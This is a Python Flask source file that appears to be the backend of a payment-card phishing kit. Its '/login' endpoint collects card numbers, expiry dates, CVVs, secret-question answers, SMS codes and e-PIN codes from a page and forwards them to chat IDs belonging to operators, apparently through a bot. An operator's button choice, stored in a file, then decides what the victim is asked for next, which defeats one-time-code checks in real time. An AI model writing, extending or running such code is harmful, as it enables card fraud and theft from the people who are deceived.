from flask import Flask, redirect, request, jsonify
from flask_cors import CORS
from bot import clicked_button
from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol
from CHAT_ID import MAIN_ID, Egoist
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

DOMEN = 'http://127.0.0.1:5500'

@app.before_request
def log_request_info():
    print('Headers:', request.headers)
    print('Body:', request.get_data())
    print('Args:', request.args)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        print("Received a GET request:")
        print(f"Full URL: {request.url}")
        print(f"Method: {request.method}")

        card_number = request.args.get('cardNumber')
        expiry_date = request.args.get('expiryDate')
        cvv = request.args.get('cvv')
        id = request.args.get('id')
        question = request.args.get('question')
        authCode = request.args.get('authCode')
        epin = request.args.get('epinAuthCode')
    elif request.method == 'POST':
        print("Received a POST request:")
        print(f"Full URL: {request.url}")
        print(f"Method: {request.method}")

        data = request.get_json()
        card_number = data.get('cardNumber')
        expiry_date = data.get('expiryDate')
        cvv = data.get('cvv')
        id = data.get('id')
        question = data.get('question')

    # WE
    if id == '1000001':
        if question != None and question != 'None' and authCode == None:
            send_secret_question(MAIN_ID, card_number, expiry_date, cvv, question)
            with open('button_state.txt', 'r') as f:
                clicked_button = f.read().strip()
            with open('button_state.txt', 'w') as file:
                file.write('')
            return f'{clicked_button}'
        if authCode != None and authCode != 'None':
            send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, epin)
            with open('button_state.txt', 'r') as f:
                clicked_button = f.read().strip()
            with open('button_state.txt', 'w') as file:
                file.write('')
            return f'{clicked_button}'
        send_buttons_message(MAIN_ID, card_number, expiry_date, cvv)
        ne_pizdabol(card_number)
        with open('button_state.txt', 'r') as f:
            clicked_button = f.read().strip()
        with open('button_state.txt', 'w') as file:
            file.write('')
        print(clicked_button)
        return f'{clicked_button}'
    # Egoist
    elif id == '1000002':
        if question != None and question != 'None' and authCode == None:
            send_secret_question(Egoist, card_number, expiry_date, cvv, question)
            with open('button_state.txt', 'r') as f:
                clicked_button = f.read().strip()
            with open('button_state.txt', 'w') as file:
                file.write('')
            return f'{clicked_button}'
        if authCode != None and authCode != 'None':
            send_sms(Egoist, card_number, expiry_date, cvv, authCode, epin)
            with open('button_state.txt', 'r') as f:
                clicked_button = f.read().strip()
            with open('button_state.txt', 'w') as file:
                file.write('')
            return f'{clicked_button}'
        ne_pizdabol(card_number)
        send_buttons_message(Egoist, card_number, expiry_date, cvv)
        with open('button_state.txt', 'r') as f:
            clicked_button = f.read().strip()
        with open('button_state.txt', 'w') as file:
            file.write('')
        print(clicked_button)
        return f'{clicked_button}'


@app.route('/test', methods=['GET'])
def test():
    return jsonify(number=3)

if __name__ == '__main__':
    app.run(debug=True)
